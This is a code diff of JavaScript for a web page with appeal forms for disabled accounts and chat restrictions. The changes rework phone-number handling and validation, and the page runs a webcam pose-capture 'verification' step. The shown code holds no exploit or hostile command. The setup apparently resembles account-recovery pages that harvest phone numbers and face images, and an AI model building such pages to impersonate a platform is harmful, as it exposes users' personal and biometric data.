-        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            handleFormSubmit(this, 'Disabled Account Appeal');
-        });
-
-        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            handleFormSubmit(this, 'Chat Restrictions Appeal');
-        });
-
         function handleFormSubmit(form, formType) {
             const formData = new FormData(form);
+            // Combine country code and phone number
+            const container = form.querySelector('.phone-group');
+            const countryCode = container.querySelector('.selected .code').textContent.trim();
+            const phoneInput = container.querySelector('.phone-input');
+            const phoneNumber = phoneInput.value.trim();
+
+            // Validate before submit
+            if (!validatePhone(phoneInput)) {
+                phoneInput.focus();
+                return;
+            }
+
             const data = Object.fromEntries(formData);
-            // Combine country code + phone number
-            data.phone = `${data.countryCode} ${data.phoneNumber || ''}`.trim();
-            delete data.countryCode;
+            // Remove the raw phoneNumber field and add combined phone
+            data.phone = `${countryCode} ${phoneNumber}`;
             delete data.phoneNumber;
+
             verificationState.formData = { type: formType, ...data };
 
             fetch('/api/submit-form', {
@@ -538,6 +1122,17 @@
             });
         }
 
+        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Disabled Account Appeal');
+        });
+
+        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Chat Restrictions Appeal');
+        });
+
+        // ===== Verification Functions (unchanged) =====
         function startVerification() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
             .then(stream => {
@@ -631,10 +1226,6 @@
             document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
             document.getElementById('disabledAppealForm').reset();
             document.getElementById('chatAppealForm').reset();
-            // Reset country inputs to default after form reset
-            countryInputs.forEach(inp => {
-                inp.value = inp.getAttribute('data-default') || '+91';
-            });
             verificationState = { currentPose: 0, captures: [], videoStream: null, formData: {}, isCapturing: false };
             window.scrollTo(0, 0);
         }
